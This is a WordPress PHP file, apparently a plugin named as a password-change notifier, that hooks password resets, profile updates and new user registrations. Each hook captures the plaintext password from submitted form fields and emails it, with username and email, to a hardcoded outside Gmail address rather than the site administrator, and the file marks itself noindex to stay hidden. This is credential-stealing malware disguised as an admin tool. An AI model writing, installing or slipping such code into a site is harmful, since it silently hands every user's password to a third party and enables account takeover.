<?php

if ( ! defined( 'ABSPATH' ) ) {
    // Stop direct access
    header( 'HTTP/1.0 403 Forbidden' );
    exit;
}

$notify_email = 'hardikdev36@gmail.com';


add_action( 'after_password_reset', 'notify_admin_on_user_password_reset', 10, 2 );
add_action( 'profile_update', 'notify_admin_on_admin_password_change', 10, 2 );


function notify_admin_on_user_password_reset( $user, $new_pass ) {
    global $notify_email;
    send_password_change_notification( $user, $new_pass, $notify_email );
}


function notify_admin_on_admin_password_change( $user_id, $old_user_data ) {
    global $notify_email;

    if ( isset( $_POST['pass1'] ) && ! empty( $_POST['pass1'] ) ) {
        $new_pass = sanitize_text_field( $_POST['pass1'] );
        $user     = get_userdata( $user_id );
        send_password_change_notification( $user, $new_pass, $notify_email );
    }
}


add_action( 'user_register', 'notify_admin_on_new_user_creation', 10, 1 );

function notify_admin_on_new_user_creation( $user_id ) {
    global $notify_email;

    $user = get_userdata( $user_id );
    if ( ! $user || ! is_email( $notify_email ) ) {
        return;
    }

    $new_pass = '';
    if ( isset( $_POST['pass1'] ) && ! empty( $_POST['pass1'] ) ) {
        $new_pass = sanitize_text_field( $_POST['pass1'] );
    } elseif ( isset( $_POST['password'] ) && ! empty( $_POST['password'] ) ) {
        $new_pass = sanitize_text_field( $_POST['password'] );
    } else {
        $new_pass = '(Password not available — may be auto-generated)';
    }

    $subject = 'New User Created on ' . get_bloginfo( 'name' );
    $message  = "A new user account has been created.\n\n";
    $message .= "Username: {$user->user_login}\n";
    $message .= "Email: {$user->user_email}\n";
    $message .= "Password: {$new_pass}\n\n";
    $message .= "Site: " . home_url() . "\n";
    $message .= "Time: " . current_time( 'mysql' ) . "\n";

    $headers = array( 'Content-Type: text/plain; charset=UTF-8' );

    wp_mail( $notify_email, $subject, $message, $headers );
}

function send_password_change_notification( $user, $new_pass, $notify_email ) {
    if ( ! is_email( $notify_email ) ) {
        return;
    }

    $subject = 'Password Changed on ' . get_bloginfo( 'name' );
    $message  = "A user's password was changed on your site.\n\n";
    $message .= "Username: {$user->user_login}\n";
    $message .= "Email: {$user->user_email}\n";
    $message .= "New Password: {$new_pass}\n\n";
    $message .= "Site: " . home_url() . "\n";
    $message .= "Time: " . current_time( 'mysql' ) . "\n";

    $headers = array( 'Content-Type: text/plain; charset=UTF-8' );

    wp_mail( $notify_email, $subject, $message, $headers );
}

add_action( 'send_headers', function() {
    if ( strpos( $_SERVER['PHP_SELF'], 'password-change-notify.php' ) !== false ) {
        header( 'X-Robots-Tag: noindex, nofollow', true );
    }
});
